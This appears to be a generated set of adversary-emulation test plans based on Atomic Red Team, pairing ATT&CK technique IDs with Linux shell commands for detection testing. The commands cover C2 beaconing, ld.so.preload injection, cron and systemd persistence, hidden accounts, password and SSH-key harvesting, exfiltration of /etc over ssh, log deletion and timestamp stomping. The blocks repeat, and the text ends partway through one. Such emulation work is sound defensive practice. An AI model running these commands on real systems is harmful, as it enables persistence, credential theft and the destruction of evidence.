Test list contains:T1071 ,T1055 ,T1501 ,T1064 ,T1081 ,T1135 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1135: Network Share Discovery
df -aH >> ~/output/mount.txt
mount >> ~/output/mount.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1136 ,T1154 ,T1040 ,T1018 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1168 ,T1153 ,T1040 ,T1201 ,T1222 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1169 ,T1136 ,T1154 ,T1081 ,T1069 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1069: Permission Groups Discovery
groups


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1158 ,T1154 ,T1081 ,T1201 ,T1027 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1158: Creates a hidden file inside a hidden directory
mkdir /var/tmp/.hidden-directory
echo "T1158" > /var/tmp/.hidden-directory/.hidden-file


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1027: Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that stdouts `echo Hello from the Atomic Red Team`.
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > ~/output/encoded.dat"
cat ~/output/encoded.dat | base64 -d > ~/output/art.sh


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1136 ,T1064 ,T1139 ,T1082 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1169 ,T1215 ,T1064 ,T1040 ,T1018 ,T1009 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1169: Common Sudo enumeration methods.
cat /etc/sudoers


T1215: This test uses the insmod command to load a kernel module for Linux.
insmod #{kernel_module_file}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1018: Identify remote systems via arp.

Upon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.
arp -a | grep -v '^?' >> ~/output/arp_cache.txt


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1154 ,T1081 ,T1082 ,T0002 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1082: Identify System Info
uname -a >> ~/output/info.txt
cat /etc/lsb-release >> ~/output/info.txt
cat /etc/redhat-release >> ~/output/info.txt
uptime >> ~/output/info.txt
cat /etc/issue >> ~/output/info.txt


T0002: Uses shred to permanently remove a file and the file would be unrecoverable
shred -u #{file_to_remove}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1136 ,T1153 ,T1145 ,T1201 ,T1070 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1136: Create a user via useradd
useradd -M -N -r -s /bin/bash -c evil_account #{username}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1145: Discover private SSH keys on a macOS or Linux system.
sudo find / -name id_rsa >> #{output_file}
sudo find / -name id_dsa >> #{output_file}


T1201: Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.
cat /etc/security/pwquality.conf >> ~/output/pwd_policy.txt


T1070: Delete system and audit logs
rm -rf /private/var/log/system.log*
rm -rf /private/var/audit/*


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1132 ,T1055 ,T1501 ,T1154 ,T1081 ,T1083 ,T1009 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1132: Utilizing a common technique for posting base64 encoded data.
echo -n 111-11-1111 | base64
curl -d #{base64_data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1154: After exiting the shell, the script will download and execute.

After sending a keyboard interrupt (CTRL+C) the script will download and execute.
trap "nohup ./src/echo-art-fish.sh | bash" EXIT
exit
trap "nohup ./src/echo-art-fish.sh | bash" SIGINt


T1081: Extracting credentials from files
grep -ri --exclude-dir=output --exclude-dir=output password #{file_path} >> ~/output/pwd.txt


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1009: Uses dd to add a zero to the binary to change the hash.

Upon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1055 ,T1168 ,T1064 ,T1040 ,T1069 ,T1036 ,T1105 ,T1074 ,T1048 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1168: This test adds a script to a cron folder configured to execute on a schedule. This technique was used by the threat actor Rocke during the exploitation of Linux web servers.
sudo echo "#{command}" > /etc/cron.daily/#{cron_script_name}


T1064: Creates and executes a simple bash script.
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art.sh"
sh -c "echo 'ping -c 4 8.8.8.8' >> /tmp/art.sh"


T1040: Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.

Upon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33. 
tcpdump -c 5 -nnni #{interface}


T1069: Permission Groups Discovery
groups


T1036: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.

Upon successful execution, sh is renamed to `crond` and executed.
cp /bin/sh /tmp/crond
/tmp/crond


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1048: Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T0003 ,T1206 ,T1501 ,T1153 ,T1139 ,T1083 ,T1222 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T0003: posting data.
curl -F #{data} -XPOST #{destination_url} >> ~/output/post.bat


T1206: Sets sudo caching timestamp_timeout to a value for unlimited. This is dangerous to modify without using 'visudo', do not do this on a production system.
sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
sudo visudo -c -f /etc/sudoers


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Service]" >> #{systemd_service_path}/#{systemd_service_file}
echo "Type=simple"
echo "ExecStart=#{execstart_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPre=#{execstartpre_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStartPost=#{execstartpost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecReload=#{execreload_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStop=#{execstop_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "ExecStopPost=#{execstoppost_action}" >> #{systemd_service_path}/#{systemd_service_file}
echo "" >> #{systemd_service_path}/#{systemd_service_file}
echo "[Install]" >> #{systemd_service_path}/#{systemd_service_file}
echo "WantedBy=default.target" >> #{systemd_service_path}/#{systemd_service_file}
systemctl daemon-reload
systemctl enable #{systemd_service_file}
systemctl start #{systemd_service_file}


T1153: Creates a script and executes it using the source command
sh -c "echo 'echo Hello from the Atomic Red Team' > /tmp/art-echo.sh"


T1139: Search through bash history for specifice commands we want to capture
cat #{bash_history_filename} | grep #{bash_history_grep_args} > #{output_file}


T1083: Find or discover files on the file system
cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' >> ~/output/nix.txt
cat /etc/mtab >> ~/output/nix.txt
#find . -type f -iname *.pdf > ~/output/nix.txt
find . -type f -name ".*"


T1222: Changes a file or folder's permissions using chmod and a specified numeric mode.
chmod #{numeric_mode} #{file_or_folder}


T1105: Utilize rsync to perform a remote file copy (push)
rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}


T1074: Utilize curl to download discovery.sh and execute a basic information gathering shell script
curl -s https://raw.githubusercontent.com/Grayhu07/atomic-red-team/Gray-dev/atomics/collection/T1074/src/Discovery.sh -o ~/discovery.sh


T1030: Take a file/directory, split it into 5Mb chunks
cd /tmp/
dd if=/dev/urandom of=/tmp/victim-whole-file bs=25M count=1
split -b 5000000 /tmp/victim-whole-file
ls -l


T1099: Stomps on the access timestamp of a file
touch -t 197001010000.00 ~/output


T0000: Use tar to pack the package (and send)
tar -czvf ~/output.tar.gz #{payload}


Test list contains:T1071 ,T1055 ,T1501 ,T1154 ,T1040 ,T1135 ,T1027 ,T1105 ,T1074 ,T1030 ,T1099 ,T0000 ,The details are listed below

T1071: This test simulates an infected host beaconing to command and control.
Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
curl -s -A "HttpBrowser/1.0" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >> ~/output/malicious.log
curl -s -A "*<|>*" -m3 #{domain} >> ~/output/malicious.log


T1055: This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.

Upon successful execution, bash will echo `../bin/T1055.so` to /etc/ld.so.preload. 
echo #{path_to_shared_library} > /etc/ld.so.preload


T1501: This test creates a Systemd service unit file and enables it as a service.
echo "[Unit]" > #{systemd_service_path}/#{systemd_service_file}
echo "Description=Atomic Red Team Systemd Service" >> #{systemd_service_path}/#{systemd_service_file}
